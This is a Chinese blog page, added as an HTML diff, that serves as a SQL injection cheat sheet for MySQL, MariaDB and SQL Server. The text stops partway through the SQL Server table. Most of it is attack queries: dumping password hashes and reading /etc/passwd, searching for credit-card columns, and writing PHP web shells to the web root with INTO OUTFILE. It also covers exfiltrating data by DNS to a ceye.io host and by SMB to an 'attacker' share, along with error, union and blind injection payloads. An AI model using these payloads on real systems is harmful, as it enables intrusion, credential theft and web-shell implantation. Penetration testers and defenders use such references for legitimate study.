@@ -1,0 +1,2155 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Mysql攻击队列信息收集   Description Query    Version SELECT @@version;   User SELECT user() SELECT system_user();   Users SELECT user FROM mysql.user * SELECT Super_priv FROM mysql.user WHERE user= &amp;#39;root&amp;">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql备忘录">
+<meta property="og:url" content="https://wh0ale.github.io/2019/10/15/sql备忘录/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Mysql攻击队列信息收集   Description Query    Version SELECT @@version;   User SELECT user() SELECT system_user();   Users SELECT user FROM mysql.user * SELECT Super_priv FROM mysql.user WHERE user= &amp;#39;root&amp;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-16_19-51-01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-18_15-33-18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-18_15-36-28.png">
+<meta property="og:updated_time" content="2019-10-21T10:48:40.923Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql备忘录">
+<meta name="twitter:description" content="Mysql攻击队列信息收集   Description Query    Version SELECT @@version;   User SELECT user() SELECT system_user();   Users SELECT user FROM mysql.user * SELECT Super_priv FROM mysql.user WHERE user= &amp;#39;root&amp;">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-16_19-51-01.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/10/15/sql备忘录/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sql备忘录 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/10/15/sql备忘录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">sql备忘录
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-15 11:15:47" itemprop="dateCreated datePublished" datetime="2019-10-15T11:15:47+08:00">2019-10-15</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-10-21 18:48:40" itemprop="dateModified" datetime="2019-10-21T18:48:40+08:00">2019-10-21</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">45k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">40 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="攻击队列"><a href="#攻击队列" class="headerlink" title="攻击队列"></a>攻击队列</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version</td>
+<td align="left"><code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td align="left">User</td>
+<td align="left"><code>SELECT user() SELECT system_user();</code></td>
+</tr>
+<tr>
+<td align="left">Users</td>
+<td align="left"><code>SELECT user FROM mysql.user * SELECT Super_priv FROM mysql.user WHERE user= &#39;root&#39; LIMIT 1,1;</code></td>
+</tr>
+<tr>
+<td align="left">Tables</td>
+<td align="left"><code>SELECT table_schema, table_name FROM information_schema.tables;</code></td>
+</tr>
+<tr>
+<td align="left">Columns</td>
+<td align="left"><code>SELECT table_name, column_name FROM information_schema.columns;</code></td>
+</tr>
+<tr>
+<td align="left">Databases</td>
+<td align="left"><code>SELECT schema_name FROM information_schema.schemata ;</code></td>
+</tr>
+<tr>
+<td align="left">Current Database Name</td>
+<td align="left"><code>SELECT database();</code></td>
+</tr>
+<tr>
+<td align="left">Query another Database</td>
+<td align="left"><code>USE [database_name]; SELECT database(); SELECT [column] FROM [database_name].[table_name];</code></td>
+</tr>
+<tr>
+<td align="left">Number of Columns</td>
+<td align="left"><code>SELECT count(*) FROM information_schema.columns WHERE table_name = &#39;[table_name]&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">DBA Accounts</td>
+<td align="left"><code>SELECT host, user FROM mysql.user WHERE Super_priv = &#39;Y&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">Password Hashes</td>
+<td align="left"><code>SELECT host, user, password FROM mysql.user;</code></td>
+</tr>
+<tr>
+<td align="left">Schema</td>
+<td align="left"><code>SELECT schema();</code></td>
+</tr>
+<tr>
+<td align="left">Path to Data</td>
+<td align="left"><code>SELECT @@datadir;</code></td>
+</tr>
+<tr>
+<td align="left">Read Files</td>
+<td align="left"><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;);</code></td>
+</tr>
+</tbody></table>
+<h3 id="数据定位查询"><a href="#数据定位查询" class="headerlink" title="数据定位查询"></a>数据定位查询</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Database sizes</td>
+<td align="left"><code>SELECT table_schema “Database Name&quot;,sum( data_length + index_length ) / 1024 / 1024 “Database Size in MB&quot;,sum( data_free )/ 1024 / 1024 “Free Space in MB&quot; FROM information_schema.TABLES GROUP BY table_schema ;</code></td>
+</tr>
+<tr>
+<td align="left">Database name keyword</td>
+<td align="left"><code>SELECT table_schema “Database Name&quot; FROM information_schema.TABLES WHERE table_schema LIKE “%passwords%&quot; GROUP BY table_schema ;</code></td>
+</tr>
+<tr>
+<td align="left">Table name keyword</td>
+<td align="left"><code>SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE “information_schema&quot; AND table_name LIKE &quot;%admin%&quot;;</code></td>
+</tr>
+<tr>
+<td align="left">Column name keyword</td>
+<td align="left"><code>SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE ”%password%“;</code></td>
+</tr>
+<tr>
+<td align="left">Column data regex</td>
+<td align="left"><code>SELECT * from credit_cards WHERE cc_number REGEXP &#39;^4[0-9]{15}$&#39;;</code></td>
+</tr>
+</tbody></table>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Command Execution (PHP)</td>
+<td align="left"><code>SELECT &quot;&lt;? echo passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO OUTFILE &#39;/var/www/shell.php&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Command Execution with MySQL CLI Access</td>
+<td align="left"><a href="https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="noopener">https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td>
+</tr>
+</tbody></table>
+<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Dump to file</td>
+<td align="left"><code>SELECT * FROM mytable INTO dumpfile &#39;/tmp/somefile&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Dump PHP Shell</td>
+<td align="left"><code>SELECT &#39;system($_GET[\&#39;c\&#39;]); ?&gt;&#39; INTO OUTFILE &#39;/var/www/shell.php&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Read File</td>
+<td align="left"><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">Read File Obfuscated</td>
+<td align="left"><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69) reads c:\boot.ini</code></td>
+</tr>
+<tr>
+<td align="left">File Privileges</td>
+<td align="left"><code>SELECT file_priv FROM mysql.user WHERE user = &#39;netspi&#39; SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &#39;file&#39; AND grantee like &#39;%netspi%&#39;</code></td>
+</tr>
+</tbody></table>
+<h3 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Create Users</td>
+<td align="left"><code>CREATE USER &#39;netspi&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Drop User</td>
+<td align="left"><code>DROP USER netspi</code></td>
+</tr>
+</tbody></table>
+<h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DNS Request</td>
+<td align="left"><code>SELECT LOAD_FILE(concat(&#39;\\\\&#39;,(QUERY_WITH_ONLY_ONE_ROW),&#39;sql.rqe94e.ceye.io\&#39;))</code></td>
+</tr>
+<tr>
+<td align="left">SMB Share</td>
+<td align="left"><code>SELECT * FROM USERS INTO OUTFILE &#39;\\attacker\SMBshare\output.txt&#39;</code></td>
+</tr>
+<tr>
+<td align="left">HTTP Server</td>
+<td align="left"><code>SELECT * FROM USERS INTO OUTFILE &#39;/var/www/html/output.txt&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Numeric Concatenation</td>
+<td align="left"><code>SELECT length(user()) SELECT ASCII(substr(user(),1))</code></td>
+</tr>
+</tbody></table>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">XML Parse Error</td>
+<td align="left"><code>SELECT extractvalue(rand(),concat(0x3a,(select version())))</code></td>
+</tr>
+<tr>
+<td align="left">Double Query</td>
+<td align="left"><code>SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)2))x FROM information_schema.TABLES GROUP BY x)a)</code></td>
+</tr>
+<tr>
+<td align="left">Get Current Database</td>
+<td align="left"><code>SELECT a()</code></td>
+</tr>
+<tr>
+<td align="left">ExtractValue (最长32位)</td>
+<td align="left"><code>select name,password from typecho.typecho_users where name = &quot;admin&quot; and extractvalue(1, concat(0x7e, (select @@version),0x7e));</code></td>
+</tr>
+<tr>
+<td align="left">UpdateXml (最长32位)</td>
+<td align="left"><code>select name,password from typecho.typecho_users where name = &quot;admin&quot; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></td>
+</tr>
+</tbody></table>
+<p>NAME_CONST(适用于低版本，不太好用)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,password from typecho.typecho_users where name = &quot;admin&quot; and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Union-Based-Injection"><a href="#Union-Based-Injection" class="headerlink" title="Union-Based Injection"></a>Union-Based Injection</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Union</td>
+<td align="left"><code>SELECT &quot;mysql&quot; UNION SELECT @@version</code></td>
+</tr>
+<tr>
+<td align="left">Union subquery</td>
+<td align="left"><code>SELECT &quot;mysql&quot; UNION (select @@version)</code></td>
+</tr>
+<tr>
+<td align="left">Union null</td>
+<td align="left"><code>SELECT &quot;mysql&quot;,&quot;test&quot; UNION SELECT @@version,null</code></td>
+</tr>
+<tr>
+<td align="left">Stacked Queries</td>
+<td align="left"><code>SELECT &quot;mysql&quot;; INSERT INTO &#39;docs&#39; (&#39;content&#39;) VALUES ((SELECT @@version))</code></td>
+</tr>
+</tbody></table>
+<h3 id="Blind-Injection"><a href="#Blind-Injection" class="headerlink" title="Blind Injection"></a>Blind Injection</h3><h4 id="Partial-Blind"><a href="#Partial-Blind" class="headerlink" title="Partial-Blind"></a>Partial-Blind</h4><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version is 5.x.x</td>
+<td align="left"><code>SELECT substring(version(),1,1)=5</code></td>
+</tr>
+<tr>
+<td align="left">Subselect enabled</td>
+<td align="left"><code>SELECT 1 AND (select 1)=1</code></td>
+</tr>
+<tr>
+<td align="left">Table log_table exists</td>
+<td align="left"><code>SELECT 1 AND (select 1 from log_table limit 0,1)=1</code></td>
+</tr>
+<tr>
+<td align="left">Column message exists in table log_table</td>
+<td align="left"><code>SELECT message FROM log_table LIMIT 0,1</code></td>
+</tr>
+<tr>
+<td align="left">First letter of first message is t</td>
+<td align="left"><code>SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</code></td>
+</tr>
+</tbody></table>
+<h4 id="Full-Blind"><a href="#Full-Blind" class="headerlink" title="Full-Blind"></a>Full-Blind</h4><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">User is root</td>
+<td align="left"><code>SELECT IF(user() LIKE &#39;root@%&#39;, SLEEP(5), null)</code></td>
+</tr>
+<tr>
+<td align="left">User is root (Benchmark method)</td>
+<td align="left"><code>SELECT IF(user() LIKE &#39;root@%&#39;, BENCHMARK(5000000, ENCODE(&#39;Slow Down&#39;,&#39;by 5 seconds&#39;)), null)</code></td>
+</tr>
+<tr>
+<td align="left">Version is 5.x.x</td>
+<td align="left"><code>SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</code></td>
+</tr>
+</tbody></table>
+<h1 id="MariaDB"><a href="#MariaDB" class="headerlink" title="MariaDB"></a>MariaDB</h1><p>docker mariadb</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search mariadb</span><br><span class="line">docker pull mariadb</span><br><span class="line">docker exec -it 9ce9d8505a1d bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p>查找所有用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(user) from mysql.user;</span><br></pre></td></tr></table></figure>
+
+<p>用户hash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(password) from mysql.user where user=&apos;root&apos;</span><br></pre></td></tr></table></figure>
+
+<p>数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p>表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(table_name) from information_schema.tables where table_schema=&apos;table_name&apos;;//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line"></span><br><span class="line">SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=&apos;table_name_xxx&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>列名:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(column_name) from information_schema.columns where table_name=&apos;column_name_xxx&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>读文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(&apos;/etc/passwd&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.zeddyu.info/2019/03/06/Sqli备忘录/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/</a></p>
+<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h1><p>docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker pull microsoft/mssql-server-linux</span><br><span class="line">//docker run --name MSSQL_1433 -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=mssql&apos; -p 1433:1433 -d microsoft/mssql-server-linux</span><br><span class="line">sudo docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;SA_PASSWORD=&lt;Wh0ale@Passw0rd&gt;&quot; \</span><br><span class="line">   -p 1433:1433 --name mssql1 \</span><br><span class="line">   --cap-add=SYS_PTRACE --security-opt seccomp=unconfined\</span><br><span class="line">   -d mcr.microsoft.com/mssql/server:2019-CTP3.2-ubuntu</span><br><span class="line">docker exec -it MSSQL_1433 /bin/bash</span><br><span class="line">/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &apos;&lt;Wh0ale@Passw0rd&gt;&apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>--cap-add //添加某个capabilites属性 --cap-del //剔除某个默认的capabilites属性</p>
+<p>gdb调试需要SYS_PTRACE属性</p>
+</blockquote>
+<p>出现内存不足情况</p>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Edit the /etc/default/grub file.</span><br><span class="line">Set the GRUB_CMDLINE_LINUX value as follows:</span><br><span class="line"></span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;cgroup_enable=memory swapaccount=1&quot;</span><br><span class="line">Save and close the file.</span><br><span class="line"></span><br><span class="line">$ sudo update-grub</span><br><span class="line">Reboot your system.</span><br></pre></td></tr></table></figure>
+
+<p>然后又出现报错<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker # 开机自动启动docker</span><br><span class="line">systemctl start docker # 启动docker</span><br><span class="line">systemctl restart docker # 重启dokcer</span><br></pre></td></tr></table></figure>
+
+<p>继续报错<code>You have to remove (or rename) that container to be able to reuse that name.</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker kill fd3c0c622af6</span><br><span class="line">docker rm fd3c0c622af6</span><br></pre></td></tr></table></figure>
+
+<p>重新pull就ok了</p>
+<p>连接时又出现错误<code>Error: Microsoft ODBC Driver 17 for SQL Server : Login failed for user &#39;SA&#39;..</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it sql1 /opt/mssql-tools/bin/sqlcmd \</span><br><span class="line">   -S localhost -U SA -P &quot;&lt;YourStrong@Passw0rd&gt;&quot; \</span><br><span class="line">   -Q &apos;ALTER LOGIN SA WITH PASSWORD=&quot;&lt;YourNewStrong@Passw0rd&gt;&quot;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>想起来了，密码应该是<code>&lt;Wh0ale@Passw0rd&gt;</code></p>
+<h2 id="攻击队列-1"><a href="#攻击队列-1" class="headerlink" title="攻击队列"></a>攻击队列</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">版本</td>
+<td align="left"><code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td align="left">User</td>
+<td align="left">SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td>
+</tr>
+<tr>
+<td align="left">Users</td>
+<td align="left"><code>SELECT name from master..syslogins</code></td>
+</tr>
+<tr>
+<td align="left">Tables</td>
+<td align="left"><code>SELECT table_catalog, table_name FROM information_schema.columns</code></td>
+</tr>
+<tr>
+<td align="left">Columns</td>
+<td align="left"><code>SELECT table_catalog, column_name FROM information_schema.columns</code></td>
+</tr>
+<tr>
+<td align="left">Databases</td>
+<td align="left"><code>SELECT name from master..sysdatabases;</code></td>
+</tr>
+<tr>
+<td align="left">Database Name</td>
+<td align="left"><code>SELECT db_name();</code></td>
+</tr>
+<tr>
+<td align="left">Server Name</td>
+<td align="left"><code>SELECT @@SERVERNAME</code></td>
+</tr>
+<tr>
+<td align="left">查找存储过程</td>
+<td align="left"><code>SELECT * from master..sysobjects where name like &#39;sp%&#39; order by name desc</code></td>
+</tr>
+<tr>
+<td align="left">用户名的主要ID</td>
+<td align="left"><code>SELECT SUSER_ID(&#39;sa&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">主体ID的用户名</td>
+<td align="left"><code>SELECT SUSER_NAME(1)</code></td>
+</tr>
+<tr>
+<td align="left">检查帐户是否为管理员</td>
+<td align="left">IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))<br>SELECT is_srvrolemember(&#39;sysadmin&#39;);</td>
+</tr>
+<tr>
+<td align="left">Policies</td>
